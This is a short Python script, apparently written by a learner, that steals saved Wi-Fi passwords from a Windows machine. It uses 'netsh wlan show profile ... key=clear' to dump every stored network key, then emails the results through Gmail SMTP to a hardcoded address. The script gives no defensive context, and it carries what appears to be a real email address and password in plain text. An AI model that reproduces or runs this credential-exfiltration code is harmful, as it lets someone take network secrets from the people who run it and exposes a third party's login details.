#!/usr/bin/env python

import subprocess, smtplib, re


def sendmail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


def whitespace(string):
    count = -1
    for a in string:
        if a.isspace() == True:
            count += 1
    if count >= 1:
        return True;
    return False


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""

for networkname in networks_names_list:
    if whitespace(networkname) == False:
        command = "netsh wlan show profile " + str(networkname).strip() + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        password = re.search("(?:Key Content\s*:\s)(.*)", current_result)
        if password:
            result = result + current_result
        else:
            continue
    else:
        continue
sendmail("shipra.20010413@gmail.com", "11mishrashipra2001", result)